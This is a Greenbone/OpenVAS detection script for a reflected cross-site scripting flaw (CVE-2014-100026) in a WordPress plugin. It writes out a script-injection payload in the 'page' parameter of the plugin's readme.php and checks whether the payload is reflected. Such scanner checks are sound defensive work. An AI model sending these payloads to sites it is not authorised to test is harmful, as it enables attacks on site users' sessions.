CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805268" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-100026" );
	script_bugtraq_id( 64699 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-02-04 12:02:20 +0530 (Wed, 04 Feb 2015)" );
	script_name( "WordPress April's Super Functions Pack Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  April's Super Functions Pack Plugin and is prone to cross site scripting
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'page' GET parameter in
  wp-content/plugins/aprils-super-functions-pack/readme.php script is not properly
  sanitised before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to
  execute arbitrary HTML and script code in a user's browser session in the context
  of an affected site." );
	script_tag( name: "affected", value: "WordPress April's Super Functions Pack Plugin
  prior to version 1.4.8" );
	script_tag( name: "solution", value: "Upgrade to version 1.4.8 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/55576" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/90172" );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/aprils-super-functions-pack/changelog" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/aprils-super-functions-pack/readme.php?pa" + "ge=\"><script>alert(document.cookie);</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>", extra_check: ">April's Super Functions Pack<" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

